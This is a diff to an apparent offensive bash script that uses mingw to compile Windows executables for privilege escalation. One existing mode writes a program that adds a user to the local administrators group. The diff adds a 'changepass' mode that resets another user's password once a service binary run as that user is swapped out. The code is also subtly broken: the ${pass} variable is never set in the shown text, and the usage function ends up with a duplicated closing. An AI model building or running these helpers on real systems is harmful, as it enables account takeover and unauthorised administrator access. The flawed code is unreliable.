@@ -17,6 +17,18 @@ usage()
         echo "#                      you have F rights on a bin you #"
         echo "#                      can replace with this.         #"
         echo "#                                                     #"
+        echo "#                      changepass                     #"
+        echo "#                      changes a user's password if   #"
+        echo "#                      you can for example run a      #"
+        echo "#                      binary/service as this user    #"
+        echo "#                      where the binary/service is    #"
+        echo "#                      something you can replace with #"
+        echo "#                      the executable produced by     #"
+        echo "#                      this script, param1=username   #"
+        echo "#                      param2 the user's new pass.    #"
+        echo "#,___________________________________________________,#"
+}
+
         echo "#,___________________________________________________,#"
 }
 
@@ -24,7 +36,7 @@ usage()
 command="${1}"
 builder="x86_64-w64-mingw32-gcc"
 
-if [[ "${command^^}" == "ADDUSER" ]]
+if [[ "${command^^}" == "ADDUSER" ]] || [[ "${command^^}" == "CHANGEPASS" ]]
 then
         user="${2}"
         if [[ -z "${user}" ]]
@@ -39,6 +51,8 @@ then
                 exit
         fi
 
+        if [[ "${command^^}" == "ADDUSER" ]]
+        then
 printf '#include <stdlib.h>
 int main ()
 {
@@ -47,10 +61,19 @@ int main ()
         i = system ("net localgroup administrators '${user}' /add");
         return 0;
 }' > "${command}.c"
-
-        build_params="${command}.c -o ${command}.exe"
+        elif [[ "${command^^}" == "CHANGEPASS" ]]
+        then
+printf '#include <stdlib.h>
+int main ()
+{
+        int i;
+        i = system ("net user '${user}' '${pass}'");
+        return 0;
+}' > "${command}.c"
+        fi
+        build_params="${command,,}.c -o ${command,,}.exe"
         ${builder} ${build_params}
-        echo "Created ${command}.c and ${command}.exe"
+        echo "Created ${command,,}.c and ${command,,}.exe"
 elif [[ "${command^^}" == "-H" ]] || [[ "${command^^}" == "--HELP" ]]
 then
         usage
